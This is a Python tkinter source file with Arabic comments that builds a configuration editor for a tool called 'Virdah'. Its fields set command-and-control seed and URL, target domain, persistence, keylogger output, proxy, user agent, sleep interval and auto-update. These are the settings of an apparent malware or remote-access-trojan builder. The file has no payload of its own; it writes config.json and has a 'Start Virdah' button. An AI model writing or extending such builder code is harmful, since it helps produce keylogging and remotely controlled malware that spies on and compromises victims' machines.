import tkinter as tk
from tkinter import messagebox
import json

class ConfigGUI:
    def __init__(self, root, config, load_config_callback):
        self.root = root
        self.config = config
        self.load_config_callback = load_config_callback
        self.root.title("Configuration Editor")
        
        self.fields = {}
        
        # إنشاء حقول الإدخال
        self.create_field("C2 Seed", "c2_seed")
        self.create_field("Activation Trigger", "activation_trigger")
        self.create_field("Target Domain", "target_domain")
        self.create_field("Server IP", "server_ip")
        self.create_field("Server Port", "server_port")
        self.create_field("C2 URL", "c2_url")
        self.create_field("Persistence", "persistence", is_checkbox=True)
        self.create_field("Encryption Key", "encryption_key")
        self.create_field("Keylogger Enabled", "keylogger_enabled", is_checkbox=True)
        self.create_field("Keylogger Output File", "keylogger_output_file")
        self.create_field("Proxy Enabled", "proxy_enabled", is_checkbox=True)
        self.create_field("Proxy IP", "proxy_ip")
        self.create_field("Proxy Port", "proxy_port")
        self.create_field("User Agent", "user_agent")
        self.create_field("Sleep Time", "sleep_time")
        self.create_field("Auto Update", "auto_update", is_checkbox=True)
        self.create_field("Debug Mode", "debug_mode", is_checkbox=True)
        
        # زر الحفظ
        save_button = tk.Button(root, text="Save", command=self.save_config)
        save_button.pack(pady=10)
        
        # زر البدء
        start_button = tk.Button(root, text="Start Virdah", command=self.start_virdah)
        start_button.pack(pady=10)
        
        # تحميل الإعدادات الحالية
        self.load_current_config()
    
    def create_field(self, label, key, is_checkbox=False):
        frame = tk.Frame(self.root)
        frame.pack(padx=10, pady=5, fill=tk.X)
        
        tk.Label(frame, text=label).pack(side=tk.LEFT)
        
        if is_checkbox:
            var = tk.BooleanVar()
            checkbox = tk.Checkbutton(frame, variable=var)
            checkbox.pack(side=tk.RIGHT)
            self.fields[key] = var
        else:
            entry = tk.Entry(frame)
            entry.pack(side=tk.RIGHT, fill=tk.X, expand=True)
            self.fields[key] = entry
    
    def load_current_config(self):
        for key, widget in self.fields.items():
            if isinstance(widget, tk.Entry):
                widget.insert(0, self.config.get(key, ""))
            elif isinstance(widget, tk.BooleanVar):
                widget.set(self.config.get(key, False))
    
    def save_config(self):
        new_config = {}
        for key, widget in self.fields.items():
            if isinstance(widget, tk.Entry):
                new_config[key] = widget.get()
            elif isinstance(widget, tk.BooleanVar):
                new_config[key] = widget.get()
        
        with open("config.json", "w") as config_file:
            json.dump(new_config, config_file, indent=4)
        
        messagebox.showinfo("Success", "Configuration saved successfully!")
        self.config = self.load_config_callback()
    
    def start_virdah(self):
        messagebox.showinfo("Info", "Starting Advanced Virdah...")
        self.root.destroy()
